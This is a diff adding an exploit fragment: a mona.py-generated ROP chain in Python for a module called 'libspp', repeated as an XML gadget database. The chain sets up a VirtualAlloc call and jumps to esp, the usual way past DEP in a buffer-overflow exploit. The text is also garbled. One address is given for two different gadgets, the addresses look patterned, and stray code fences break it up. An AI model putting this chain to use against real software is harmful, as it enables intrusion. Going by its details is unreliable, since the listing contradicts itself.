@@ -1,0 +1,77 @@
+=== PYTHON SNIPPET (mona create_rop_chain) ===
+
+*** [ Python ] ***
+
+  def create_rop_chain():
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+      #[---INFO:gadgets_to_set_esi:---]
+      0x10111111,  # ptr to VirtualAlloc() [libspp]
+      #[---INFO:gadgets_to_set_ebp:---]
+      0x10111819,  # pop ebp # retn [libspp] 
+      0x10113111,  # & jmp esp [libspp]
+      #[---INFO:gadgets_to_set_ebx:---]
+      0x10111213,  # pop ebx # retn [libspp] 
+      0xffffffff,  # 0x00000001-> ebx
+      0x10111c1f,  # inc ebx # retn [libspp] 
+      0x10111c1f,  # inc ebx # retn [libspp] 
+      #[---INFO:gadgets_to_set_edx:---]
+      0x10111617,  # pop edx # retn [libspp] 
+      0xffffefff,  # 0x00001000-> edx
+      0x10112223,  # neg edx # retn [libspp] 
+      0x10112427,  # dec edx # retn [libspp] 
+      #[---INFO:gadgets_to_set_ecx:---]
+      0x10111415,  # pop ecx # retn [libspp] 
+      0xffffffc0,  # 0x00000040-> ecx
+      0x10111e21,  # neg ecx # retn [libspp] 
+      #[---INFO:gadgets_to_set_edi:---]
+      0x1011181b,  # pop edi # retn [libspp] 
+      0x10112428,  # retn (rop nop) [libspp]
+      #[---INFO:gadgets_to_set_eax:---]
+      0x10111111,  # pop eax # retn [libspp] 
+      0x90909090,  # nop
+      #[---INFO:pushad:---]
+      0x10112829,  # pushad # retn [libspp] 
+    ]
+    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+  rop_chain = create_rop_chain()
+
+```
+
+```javascript
+
+
+=== XML (rop db) ===
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+<rop>
+  <compatibility>
+    <target>10.4.0</target>
+  </compatibility>
+
+  <gadgets base="0x10000000">
+    <gadget offset="0x00111111">ptr to VirtualAlloc() </gadget>
+    <gadget offset="0x00111819">pop ebp # retn </gadget>
+    <gadget offset="0x00113111"> jmp esp </gadget>
+    <gadget offset="0x00111213">pop ebx # retn </gadget>
+    <gadget value="0xffffffff">0x00000001-> ebx</gadget>
+    <gadget offset="0x00111c1f">inc ebx # retn </gadget>
+    <gadget offset="0x00111c1f">inc ebx # retn </gadget>
+    <gadget offset="0x00111617">pop edx # retn </gadget>
+    <gadget value="0xffffefff">0x00001000-> edx</gadget>
+    <gadget offset="0x00112223">neg edx # retn </gadget>
+    <gadget offset="0x00112427">dec edx # retn </gadget>
+    <gadget offset="0x00111415">pop ecx # retn </gadget>
+    <gadget value="0xffffffc0">0x00000040-> ecx</gadget>
+    <gadget offset="0x00111e21">neg ecx # retn </gadget>
+    <gadget offset="0x0011181b">pop edi # retn </gadget>
+    <gadget offset="0x00112428">retn (rop nop) </gadget>
+    <gadget offset="0x00111111">pop eax # retn </gadget>
+    <gadget value="0x90909090">nop</gadget>
+    <gadget offset="0x00112829">pushad # retn </gadget>
+  </gadgets>
+</rop>
+</db>
